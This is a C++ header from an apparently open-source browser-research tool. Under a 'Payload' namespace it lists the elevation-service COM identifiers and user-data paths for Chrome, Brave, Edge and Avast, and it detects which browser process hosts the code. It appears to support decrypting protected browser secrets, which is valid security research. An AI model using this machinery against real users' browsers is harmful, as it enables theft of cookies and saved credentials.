// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include "../core/common.hpp"
#include <string>
#include <vector>
#include <map>
#include <optional>
#include <ShlObj.h>

namespace Payload {

    struct BrowserConfig {
        std::string name;
        std::wstring processName;
        CLSID clsid;
        IID iid;                        // IElevator IID (legacy, Chrome 143 and earlier)
        std::optional<IID> iid_v2;      // IElevator2 IID (Chrome 144+, preferred when available)
        std::filesystem::path userDataPath;
    };

    inline std::filesystem::path GetLocalAppData() {
        PWSTR path = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path))) {
            std::filesystem::path p(path);
            CoTaskMemFree(path);
            return p;
        }
        return {};
    }

    inline const std::map<std::string, BrowserConfig> GetConfigs() {
        auto localApp = GetLocalAppData();
        return {
            {"chrome", {"Chrome", L"chrome.exe",
                {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},  // CLSID
                {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},  // IElevatorChrome (v1)
                IID{0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}},  // IElevator2Chrome (v2)
                localApp / "Google" / "Chrome" / "User Data"}},
            {"chrome-beta", {"Chrome Beta", L"chrome.exe",
                {0xDD2646BA, 0x3707, 0x4BF8, {0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2}},  // CLSID
                {0xA2721D66, 0x376E, 0x4D2F, {0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F}},  // IElevatorChromeBeta (v1)
                IID{0xB96A14B8, 0xD0B0, 0x44D8, {0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54}},  // IElevator2ChromeBeta (v2)
                localApp / "Google" / "Chrome Beta" / "User Data"}},
            {"brave", {"Brave", L"brave.exe",
                {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},  // CLSID
                {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},  // IElevatorChrome (v1) - Brave uses Chrome's interface name
                IID{0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}},  // IElevator2Chrome (v2) - Brave reuses Chrome's IID
                localApp / "BraveSoftware" / "Brave-Browser" / "User Data"}},
            {"edge", {"Edge", L"msedge.exe",
                {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},  // CLSID
                IID{0x05EB264E, 0x4D60, 0x4F34, {0xAD, 0xB7, 0x1F, 0x98, 0x3E, 0x93, 0x0A, 0x79}},  // IElevatorEdge3 (v3, Edge 157+)
                IID{0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}},  // IElevator2Edge (v2, Edge 144-156)
                localApp / "Microsoft" / "Edge" / "User Data"}},
            {"avast", {"Avast", L"AvastBrowser.exe",
                {0xEAD34EE8, 0x8D08, 0x4CA1, {0xAD, 0xA3, 0x64, 0x75, 0x43, 0x74, 0xD8, 0x11}},  // CLSID
                {0x7737BB9F, 0xBAC1, 0x4C71, {0xA6, 0x96, 0x7C, 0x82, 0xD7, 0x99, 0x4B, 0x6F}},  // IElevatorChrome IID (Avast uses this, not base IElevator)
                std::nullopt,  // No IElevator2 for Avast
                localApp / "AVAST Software" / "Browser" / "User Data"}}
        };
    }

    inline BrowserConfig DetectBrowser() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        std::string exe = std::filesystem::path(path).filename().string();
        std::transform(exe.begin(), exe.end(), exe.begin(), ::tolower);

        if (exe == "chrome.exe") return GetConfigs().at("chrome");
        if (exe == "brave.exe") return GetConfigs().at("brave");
        if (exe == "msedge.exe") return GetConfigs().at("edge");
        if (exe == "avastbrowser.exe") return GetConfigs().at("avast");

        throw std::runtime_error("Unknown browser process");
    }

}
